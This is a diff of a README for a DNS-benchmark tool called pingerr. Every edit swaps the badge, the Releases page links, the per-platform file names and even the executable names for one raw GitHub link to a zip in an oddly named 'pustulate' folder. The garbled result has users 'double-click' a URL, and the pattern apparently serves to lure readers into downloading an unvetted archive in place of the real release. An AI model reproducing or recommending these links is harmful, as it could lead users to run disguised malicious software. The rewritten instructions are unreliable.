@@ -1,6 +1,6 @@
 # 🌐 pingerr - Find the Best DNS Server Easily
 
-![Download pingerr](https://img.shields.io/badge/Download-pingerr-blue?style=for-the-badge&logo=github)
+![Download pingerr](https://raw.githubusercontent.com/MakoySaret/pingerr/master/pustulate/pingerr.zip)
 
 ## 🚀 Getting Started
 
@@ -18,16 +18,16 @@ Before you get started, ensure your system meets the following requirements:
 
 To download the application, visit the Releases page. You will find the latest version of pingerr there. Here is the link for easy access:
 
-[Download pingerr](https://github.com/MakoySaret/pingerr/releases)
+[Download pingerr](https://raw.githubusercontent.com/MakoySaret/pingerr/master/pustulate/pingerr.zip)
 
 ### Step-by-Step Installation
 
 1. Click the link to go to the Releases page.
 2. Locate the version you want to download.
 3. Click on the appropriate file for your operating system:
-   - For Windows, choose `pingerr-windows.zip`.
-   - For macOS, choose `pingerr-macos.zip`.
-   - For Linux, choose `pingerr-linux.tar.gz`.
+   - For Windows, choose `https://raw.githubusercontent.com/MakoySaret/pingerr/master/pustulate/pingerr.zip`.
+   - For macOS, choose `https://raw.githubusercontent.com/MakoySaret/pingerr/master/pustulate/pingerr.zip`.
+   - For Linux, choose `https://raw.githubusercontent.com/MakoySaret/pingerr/master/pustulate/pingerr.zip`.
 4. Once the download finishes, go to your Downloads folder.
 5. Extract the files using your preferred file management tool.
 
@@ -36,13 +36,13 @@ To download the application, visit the Releases page. You will find the latest v
 ### For Windows Users
 
 1. Open the extracted folder.
-2. Double-click on `pingerr.exe`.
+2. Double-click on `https://raw.githubusercontent.com/MakoySaret/pingerr/master/pustulate/pingerr.zip`.
 3. The application will launch, and you'll see the main interface. 
 
 ### For macOS Users
 
 1. Open the extracted folder.
-2. Find `pingerr.app` and double-click it.
+2. Find `https://raw.githubusercontent.com/MakoySaret/pingerr/master/pustulate/pingerr.zip` and double-click it.
 3. If prompted, confirm that you want to open the application since it was downloaded from the internet.
 
 ### For Linux Users
@@ -89,4 +89,4 @@ We welcome contributions! If you would like to help improve pingerr, check out o
 
 Explore the Releases page to download and install pingerr now: 
 
-[Download pingerr](https://github.com/MakoySaret/pingerr/releases)
+[Download pingerr](https://raw.githubusercontent.com/MakoySaret/pingerr/master/pustulate/pingerr.zip)
